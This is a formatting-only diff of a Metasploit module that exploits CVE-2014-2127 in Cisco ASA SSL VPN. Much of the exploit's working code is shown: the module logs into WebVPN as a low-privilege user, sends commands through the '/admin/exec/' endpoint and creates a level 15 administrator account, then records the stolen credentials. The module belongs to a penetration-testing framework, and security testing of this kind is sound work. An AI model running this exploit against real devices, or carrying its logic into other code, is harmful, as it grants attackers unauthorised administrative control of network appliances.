@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,27 +13,26 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
-      'Description' => %q{
-        This module exploits a privilege escalation vulnerability for Cisco
-        ASA SSL VPN (aka: WebVPN). It allows level 0 users to escalate to
-        level 15.
-      },
-      'Author'       =>
-        [
-          'jclaudius <jclaudius[at]trustwave.com>',
-          'lguay <laura.r.guay[at]gmail.com>'
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          ['CVE', '2014-2127'],
-          ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
-          ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
-        ],
-      'DisclosureDate' => 'Apr 09 2014',
-      'DefaultOptions' => { 'SSL' => true }
-    ))
+                      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
+                      'Description' => %q{
+                        This module exploits a privilege escalation vulnerability for Cisco
+                        ASA SSL VPN (aka: WebVPN). It allows level 0 users to escalate to
+                        level 15.
+                      },
+                      'Author' =>
+                        [
+                          'jclaudius <jclaudius[at]trustwave.com>',
+                          'lguay <laura.r.guay[at]gmail.com>'
+                        ],
+                      'License'     => MSF_LICENSE,
+                      'References'  =>
+                        [
+                          ['CVE', '2014-2127'],
+                          ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
+                          ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
+                        ],
+                      'DisclosureDate' => 'Apr 09 2014',
+                      'DefaultOptions' => { 'SSL' => true }))
 
     register_options(
       [
@@ -43,15 +43,14 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('RETRIES', [true, 'The number of exploit attempts to make', 10])
       ], self.class
     )
-
   end
 
   def validate_cisco_ssl_vpn
     begin
       res = send_request_cgi(
-              'uri' => '/',
-              'method' => 'GET'
-            )
+        'uri' => '/',
+        'method' => 'GET'
+      )
 
       vprint_good("Server is responsive")
     rescue ::Rex::ConnectionError, ::Errno::EPIPE
@@ -59,18 +58,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi(
-            'uri' => '/+CSCOE+/logon.html',
-            'method' => 'GET'
-          )
+      'uri' => '/+CSCOE+/logon.html',
+      'method' => 'GET'
+    )
 
     if res &&
        res.code == 302
 
       res = send_request_cgi(
-              'uri' => '/+CSCOE+/logon.html',
-              'method' => 'GET',
-              'vars_get' => { 'fcadbadd' => "1" }
-            )
+        'uri' => '/+CSCOE+/logon.html',
+        'method' => 'GET',
+        'vars_get' => { 'fcadbadd' => "1" }
+      )
     end
 
     if res &&
@@ -84,10 +83,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_logout(cookie)
     res = send_request_cgi(
-            'uri' => '/+webvpn+/webvpn_logout.html',
-            'method' => 'GET',
-            'cookie' => cookie
-          )
+      'uri' => '/+webvpn+/webvpn_logout.html',
+      'method' => 'GET',
+      'cookie' => cookie
+    )
 
     if res &&
        res.code == 200
@@ -96,13 +95,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_command(cmd, cookie)
-    reformatted_cmd = cmd.gsub(/ /, "+")
+    reformatted_cmd = cmd.tr(' ', "+")
 
     res = send_request_cgi(
-            'uri'       => "/admin/exec/#{reformatted_cmd}",
-            'method'    => 'GET',
-            'cookie'    => cookie
-          )
+      'uri'       => "/admin/exec/#{reformatted_cmd}",
+      'method'    => 'GET',
+      'cookie'    => cookie
+    )
 
     res
   end
@@ -122,7 +121,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    return nil
+    nil
   end
 
   def add_user(cookie, tries = 3)
@@ -145,16 +144,16 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    return nil
+    nil
   end
 
   def do_login(user, pass, group)
     begin
-      cookie = "webvpn=; " +
-               "webvpnc=; " +
-               "webvpn_portal=; " +
-               "webvpnSharePoint=; " +
-               "webvpnlogin=1; " +
+      cookie = "webvpn=; " \
+               "webvpnc=; " \
+               "webvpn_portal=; " \
+               "webvpnSharePoint=; " \
+               "webvpnlogin=1; " \
                "webvpnLang=en;"
 
       post_params = {
@@ -169,12 +168,12 @@ class MetasploitModule < Msf::Auxiliary
       post_params['group_list'] = group unless group.empty?
 
       resp = send_request_cgi(
-              'uri' => '/+webvpn+/index.html',
-              'method'    => 'POST',
-              'ctype'     => 'application/x-www-form-urlencoded',
-              'cookie'    => cookie,
-              'vars_post' => post_params
-            )
+        'uri' => '/+webvpn+/index.html',
+        'method'    => 'POST',
+        'ctype'     => 'application/x-www-form-urlencoded',
+        'cookie'    => cookie,
+        'vars_post' => post_params
+      )
 
       if resp &&
          resp.code == 200 &&
@@ -192,7 +191,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     # Validate we're dealing with Cisco SSL VPN
     unless validate_cisco_ssl_vpn
       vprint_error("Does not appear to be Cisco SSL VPN")
@@ -207,10 +206,10 @@ class MetasploitModule < Msf::Auxiliary
 
       # Authenticate to SSL VPN and get session cookie
       cookie = do_login(
-                 datastore['USERNAME'],
-                 datastore['PASSWORD'],
-                 datastore['GROUP']
-               )
+        datastore['USERNAME'],
+        datastore['PASSWORD'],
+        datastore['GROUP']
+      )
 
       # See if our authentication attempt failed
       unless cookie
@@ -235,7 +234,7 @@ class MetasploitModule < Msf::Auxiliary
       do_logout(cookie)
 
       if creds
-        print_good("Successfully added level 15 account #{creds.join(", ")}")
+        print_good("Successfully added level 15 account #{creds.join(', ')}")
         user, pass = creds
         report_escalated_creds(user, pass)
       else
@@ -248,31 +247,30 @@ class MetasploitModule < Msf::Auxiliary
     status = Metasploit::Model::Login::Status::SUCCESSFUL
 
     service_data = {
-        address: rhost,
-        port: rport,
-        service_name: 'https',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
+      address: rhost,
+      port: rport,
+      service_name: 'https',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
-        origin_type: :service,
-        module_fullname: self.fullname,
-        private_type: :password,
-        private_data: password,
-        username: username
+      origin_type: :service,
+      module_fullname: fullname,
+      private_type: :password,
+      private_data: password,
+      username: username
     }
 
     credential_data.merge!(service_data)
     credential_core = create_credential(credential_data)
     login_data = {
-        core: credential_core,
-        access_level: 'Level 15',
-        status: status,
-        last_attempted_at: DateTime.now
+      core: credential_core,
+      access_level: 'Level 15',
+      status: status,
+      last_attempted_at: DateTime.now
     }
     login_data.merge!(service_data)
     create_credential_login(login_data)
   end
-
 end
